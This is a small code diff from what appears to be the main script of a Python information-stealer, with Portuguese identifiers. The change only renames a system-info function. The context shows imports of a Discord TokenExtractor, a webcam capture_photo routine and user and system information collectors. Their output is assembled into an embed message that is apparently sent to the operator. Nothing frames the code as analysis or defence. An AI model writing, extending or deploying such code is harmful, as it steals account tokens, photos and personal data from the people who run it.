@@ -5,7 +5,7 @@ import json
 import sys
 import zipfile
 import threading
-from plugins.systeminfo import obter_informacoes_sistema
+from plugins.systeminfo import get_system_info
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
 from plugins.userinfo import UserInfos
@@ -266,7 +266,7 @@ if __name__ == "__main__":
             embed_content += "**Informações do Sistema Operacional**\n```bash\n" + os_info + "\n```\n\n"
         
         if not executou_informacoes_sistema and cfg.get("system_info", False):
-            informacoes_sistema = obter_informacoes_sistema()
+            informacoes_sistema = get_system_info()
             executou_informacoes_sistema = True
             embed_content += "**Informações do Sistema**\n```bash\n" + informacoes_sistema + "\n```\n\n"
 
